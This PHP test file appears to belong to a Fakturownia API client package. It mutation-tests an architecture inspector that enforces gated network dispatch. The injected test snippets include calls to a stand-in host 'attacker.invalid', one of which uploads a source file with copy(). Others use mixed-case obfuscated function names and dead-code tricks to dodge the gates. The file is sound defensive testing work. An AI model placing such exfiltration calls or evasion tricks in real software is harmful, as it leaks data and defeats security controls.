<?php

declare(strict_types=1);

use Cieplik206\Fakturownia\Tests\Support\Architecture\RemoteApiArchitectureInspector;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Facade;
use Illuminate\Support\ServiceProvider;

it('rejects dispatch before authority and dead pinned gates', function (
    string $relativePath,
    string $needle,
    string $replacement,
): void {
    $sourcePath = rt3PackageRoot().'/'.$relativePath;
    $source = file_get_contents($sourcePath);

    if ($source === false) {
        throw new RuntimeException('Unable to read the architecture mutation source.');
    }

    expect($source)->toContain($needle);

    $mutated = str_replace($needle, $replacement, $source);
    $temporary = tempnam(sys_get_temp_dir(), 'fakturownia-architecture-');

    if (! is_string($temporary) || file_put_contents($temporary, $mutated) === false) {
        throw new RuntimeException('Unable to create the architecture mutation fixture.');
    }

    try {
        $files = array_values(array_filter(
            rt3PhpFiles(rt3PackageRoot().'/src'),
            static fn (string $file): bool => $file !== $sourcePath,
        ));
        $files[] = $temporary;
        $report = implode("\n", (new RemoteApiArchitectureInspector)->inspect(
            $files,
            rt3CapabilityStatuses(),
            rt3PublicMethodClassifications(),
            [Command::class, Facade::class, ServiceProvider::class, RuntimeException::class],
        ));

        expect($report)->toContain(
            'dispatch_method_not_gated Cieplik206\\Fakturownia\\Client\\ReadTransport\\ExecutesSealedSaloonReads::dispatch',
        );
    } finally {
        unlink($temporary);
    }
})->with([
    'production executor dispatch before its pinned gate' => [
        'src/Client/ReadTransport/SealedSaloonReadRequestExecutor.php',
        <<<'PHP'
        $this->assertJsonRequestContract($request);
        (new PinnedReadCapabilityGate)->assertSupported($request->capability());

        return $this->executeSealedRead($request);
PHP,
        <<<'PHP'
        $this->assertJsonRequestContract($request);
        $response = $this->executeSealedRead($request);
        (new PinnedReadCapabilityGate)->assertSupported($request->capability());

        return $response;
PHP,
    ],
    'transport dispatch before its authority check' => [
        'src/Client/ReadTransport/ExecutesSealedSaloonReads.php',
        <<<'PHP'
        $this->assertTransportExecutionAuthorized($capability);
        SaloonRuntimeIsolationGuard::assertIsolated();
PHP,
        <<<'PHP'
        $connector->createPendingRequest($request);
        $this->assertTransportExecutionAuthorized($capability);
        SaloonRuntimeIsolationGuard::assertIsolated();
PHP,
    ],
    'pinned transport gate hidden in dead code' => [
        'src/Client/ReadTransport/ExecutesSealedSaloonReads.php',
        <<<'PHP'
        (new PinnedReadCapabilityGate)->assertSupported($capability);
PHP,
        <<<'PHP'
        if (false) {
            (new PinnedReadCapabilityGate)->assertSupported($capability);
        }
PHP,
    ],
]);

it('rejects classified body swaps descriptor mismatches and inherited facade dispatch', function (): void {
    $fixture = rt3PackageRoot().'/tests/Fixtures/Architecture/remote-api-structural-bypass.php.fixture';
    $report = implode("\n", (new RemoteApiArchitectureInspector)->inspect(
        [$fixture],
        ['client.read.get' => 'passed'],
        [
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\AttributeDescriptorMismatch::get' => 'read_facade',
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedCaseVariantCallable::value' => 'local_kernel',
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedConditionalDescriptorReassignment::get' => 'read_facade',
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value' => 'local_kernel',
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedGlobalFunctionForwarder::value' => 'local_kernel',
            'Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedLocalBodySwap::value' => 'local_kernel',
        ],
        [Facade::class],
    ));

    expect($report)
        ->toContain('descriptor_dispatch_not_gated Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedLocalBodySwap::value')
        ->toContain('capability_request_dispatch_mismatch Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedConditionalDescriptorReassignment::get')
        ->toContain('capability_request_dispatch_mismatch Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\AttributeDescriptorMismatch::get')
        ->toContain('dispatch_callable Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedCaseVariantCallable::value::send')
        ->toContain('process_execution_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value exec')
        ->toContain('shell_execution_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value')
        ->toContain('eval_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value')
        ->toContain('include_require_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value include')
        ->toContain('include_require_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value require_once')
        ->toContain('callable_forwarder Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value array_map callback')
        ->toContain('callable_forwarder Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value array_filter callback')
        ->toContain('callable_forwarder Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value array_udiff')
        ->toContain('callable_forwarder Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value ob_start')
        ->toContain('dangerous_reflection_type Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value ReflectionMethod')
        ->toContain('dangerous_invocation Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value setaccessible')
        ->toContain('dangerous_invocation Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value invoke')
        ->toContain('dangerous_invocation Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\ClassifiedExecutionEscape::value bind')
        ->toContain('global_function_forbidden Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\hiddenRemoteRead')
        ->toContain('inherited_facade_dispatch_not_sealed Cieplik206\\Fakturownia\\Tests\\Fixtures\\Architecture\\UnsafeInheritedFacade');
});

it('rejects sealed trait aliases and every alternate network escape', function (): void {
    $traitReport = rt3MutationReport(
        'src/Client/ReadTransport/SealedSaloonReadRequestExecutor.php',
        '    use ExecutesSealedSaloonReads;',
        <<<'PHP'
    use ExecutesSealedSaloonReads {
        sender as public leakedSender;
    }
PHP,
    );
    $networkReport = rt3MutationReport(
        'src/Client/FakturowniaClient.php',
        <<<'PHP'
    public function read(): FakturowniaReadClient
    {
        $readClient = $this->readClient->getValue();
PHP,
        <<<'PHP'
    public function read(): FakturowniaReadClient
    {
        (new \GuzzleHttp\Client)->request('GET', 'https://attacker.invalid');
        $readClient = $this->readClient->getValue();
PHP,
    );
    $dynamicStreamWrapperReport = rt3MutationReport(
        'src/Client/FakturowniaClient.php',
        <<<'PHP'
    public function read(): FakturowniaReadClient
    {
        $readClient = $this->readClient->getValue();
PHP,
        <<<'PHP'
    public function read(): FakturowniaReadClient
    {
        $scheme = 'https';
        $url = $scheme.'://attacker.invalid';
        file_get_contents($url);
        hash_file('sha256', $url);
        \FiLe_GeT_CoNtEnTs('http'.'://attacker.invalid');
        copy(__FILE__, 'https'.'://attacker.invalid/upload');
        $readClient = $this->readClient->getValue();
PHP,
    );

    expect($traitReport)
        ->toContain('sealed_transport_trait_adaptation Cieplik206\\Fakturownia\\Client\\ReadTransport\\SealedSaloonReadRequestExecutor')
        ->and($networkReport)
        ->toContain('alternate_network_client GuzzleHttp\\Client')
        ->toContain('alternate_network_dispatch Cieplik206\\Fakturownia\\Client\\FakturowniaClient::read request')
        ->and($dynamicStreamWrapperReport)
        ->toContain('alternate_network_stream_wrapper Cieplik206\\Fakturownia\\Client\\FakturowniaClient::read file_get_contents')
        ->toContain('alternate_network_stream_wrapper Cieplik206\\Fakturownia\\Client\\FakturowniaClient::read hash_file')
        ->toContain('alternate_network_stream_wrapper Cieplik206\\Fakturownia\\Client\\FakturowniaClient::read copy');
});

it('pins dispatch cardinality case and the always-deny production gate', function (): void {
    $dispatchReport = rt3MutationReport(
        'src/Client/ReadTransport/ExecutesSealedSaloonReads.php',
        <<<'PHP'
            $response = $this->sender()->send($pendingRequest);
PHP,
        <<<'PHP'
            if (false) {
                $this->sender()->SeNd($pendingRequest);
            }

            $response = $this->sender()->send($pendingRequest);
PHP,
    );
    $gateReport = rt3MutationReport(
        'src/Client/ReadTransport/PinnedReadCapabilityGate.php',
        <<<'PHP'
        throw new UnsupportedCapability($capability);
PHP,
        <<<'PHP'
        return;
PHP,
    );

    expect($dispatchReport)
        ->toContain('dispatch_method_not_gated Cieplik206\\Fakturownia\\Client\\ReadTransport\\ExecutesSealedSaloonReads::dispatch')
        ->and($gateReport)
        ->toContain('dispatch_method_not_gated Cieplik206\\Fakturownia\\Client\\ReadTransport\\ExecutesSealedSaloonReads::dispatch');
});

it('binds each capability attribute to the exact descriptor enum case', function (): void {
    $report = rt3MutationReport(
        'src/Read/Requests/GetInvoiceRequest.php',
        <<<'PHP'
            ReadCapability::InvoiceGet->value,
            ReadCapability::InvoiceGet,
PHP,
        <<<'PHP'
            ReadCapability::ClientGet->value,
            ReadCapability::ClientGet,
PHP,
    );

    expect($report)
        ->toContain('capability_descriptor_mismatch Cieplik206\\Fakturownia\\Read\\Resources\\InvoicesResource::get');
});

it('invalidates every pinned execution escape when its source drifts', function (
    string $relativePath,
    string $needle,
    string $replacement,
    string $violation,
): void {
    expect(rt3MutationReport($relativePath, $needle, $replacement))->toContain($violation);
})->with([
    'literal claim closure scope' => [
        'src/ContractTesting/LiveEvidence/PendingLiteralRemoteConsumptionClaim.php',
        '$issue = Closure::bind(',
        '$issue = Closure::BiNd(',
        'dangerous_invocation Cieplik206\\Fakturownia\\ContractTesting\\LiveEvidence\\PendingLiteralRemoteConsumptionClaim::completeLiteralNow bind',
    ],
    'coordinator closure scope' => [
        'src/ContractTesting/LiveEvidence/RemoteConsumptionCoordinator.php',
        '$begin = Closure::bind(',
        '$begin = Closure::BiNd(',
        'dangerous_invocation Cieplik206\\Fakturownia\\ContractTesting\\LiveEvidence\\RemoteConsumptionCoordinator::beginLiteralInMemoryClaimNow bind',
    ],
    'runtime reflection guard' => [
        'src/ContractTesting/LiveEvidence/SaloonRuntimeIsolationGuard.php',
        'new ReflectionClass(Config::class)',
        'new \\ReflectionClass(Config::class)',
        'dangerous_reflection_type Cieplik206\\Fakturownia\\ContractTesting\\LiveEvidence\\SaloonRuntimeIsolationGuard::assertIsolated ReflectionClass',
    ],
    'artisan call' => [
        'src/Laravel/ArtisanConfigurationPublisher.php',
        "->call('vendor:publish'",
        "->CaLl('vendor:publish'",
        'dangerous_invocation Cieplik206\\Fakturownia\\Laravel\\ArtisanConfigurationPublisher::publish call',
    ],
]);

function rt3PackageRoot(): string
{
    return dirname(__DIR__, 2);
}

/** @return list<string> */
function rt3PhpFiles(string $directory): array
{
    $files = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));

    foreach ($iterator as $file) {
        if ($file instanceof SplFileInfo && $file->isFile() && $file->getExtension() === 'php') {
            $files[] = $file->getPathname();
        }
    }

    sort($files);

    return $files;
}

/** @return array<string, string> */
function rt3CapabilityStatuses(): array
{
    $matrix = json_decode(
        (string) file_get_contents(rt3PackageRoot().'/docs/capability-matrix.json'),
        true,
        flags: JSON_THROW_ON_ERROR,
    );
    $statuses = [];

    foreach ($matrix['capabilities'] ?? [] as $capability) {
        if (is_array($capability)
            && is_string($capability['id'] ?? null)
            && is_string($capability['live_evidence']['status'] ?? null)) {
            $statuses[$capability['id']] = $capability['live_evidence']['status'];
        }
    }

    return $statuses;
}

/** @return array<string, string> */
function rt3PublicMethodClassifications(): array
{
    $inventory = json_decode(
        (string) file_get_contents(rt3PackageRoot().'/tests/Fixtures/Architecture/public-method-inventory.json'),
        true,
        flags: JSON_THROW_ON_ERROR,
    );
    $methods = $inventory['methods'] ?? null;

    return is_array($methods) ? $methods : [];
}

function rt3MutationReport(string $relativePath, string $needle, string $replacement): string
{
    $sourcePath = rt3PackageRoot().'/'.$relativePath;
    $source = file_get_contents($sourcePath);

    if (! is_string($source) || ! str_contains($source, $needle)) {
        throw new RuntimeException("The mutation needle is missing from {$relativePath}.");
    }

    $temporary = tempnam(sys_get_temp_dir(), 'fakturownia-architecture-');

    if (! is_string($temporary)
        || file_put_contents($temporary, str_replace($needle, $replacement, $source)) === false) {
        throw new RuntimeException('Unable to create the architecture mutation fixture.');
    }

    try {
        $files = array_values(array_filter(
            rt3PhpFiles(rt3PackageRoot().'/src'),
            static fn (string $file): bool => $file !== $sourcePath,
        ));
        $files[] = $temporary;

        return implode("\n", (new RemoteApiArchitectureInspector)->inspect(
            $files,
            rt3CapabilityStatuses(),
            rt3PublicMethodClassifications(),
            [Command::class, Facade::class, ServiceProvider::class, RuntimeException::class],
        ));
    } finally {
        unlink($temporary);
    }
}
